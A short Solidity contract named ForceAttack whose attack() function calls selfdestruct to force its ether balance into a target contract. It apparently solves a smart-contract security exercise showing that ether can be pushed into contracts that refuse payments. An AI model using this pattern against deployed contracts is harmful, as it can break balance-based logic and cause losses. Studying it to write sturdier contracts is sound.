//SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

contract ForceAttack {
    constructor() payable {

    }

    function attack(address payable _contractAddress) public {
        selfdestruct(_contractAddress);
    }
}